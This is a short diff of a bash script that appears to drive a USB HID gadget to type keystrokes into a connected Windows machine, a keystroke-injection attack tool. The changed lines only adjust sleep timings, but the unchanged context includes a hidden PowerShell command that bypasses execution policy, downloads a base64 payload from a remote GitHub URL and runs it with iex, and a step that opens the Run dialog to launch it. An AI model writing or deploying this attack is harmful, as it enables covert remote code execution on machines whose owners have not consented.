@@ -3,7 +3,7 @@
 HID_DEV=/dev/hidg0
 
 while [ ! -e $HID_DEV ]; do
-  sleep 1
+  sleep 0.2
 done
 
 declare -A KEYCODES=( 
@@ -70,7 +70,7 @@ send_string() {
 POWERSHELL_CMD="powershell.exe -w Hidden -NoProfile -ep Bypass -Command \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/OrangeHatHacking/payloads/main/payload.b64'))))\""
 
 # Start injecting
-sleep .01
+sleep 0.01
 
 # Press Win+R to open Run dialog
 send_key "08" "15"
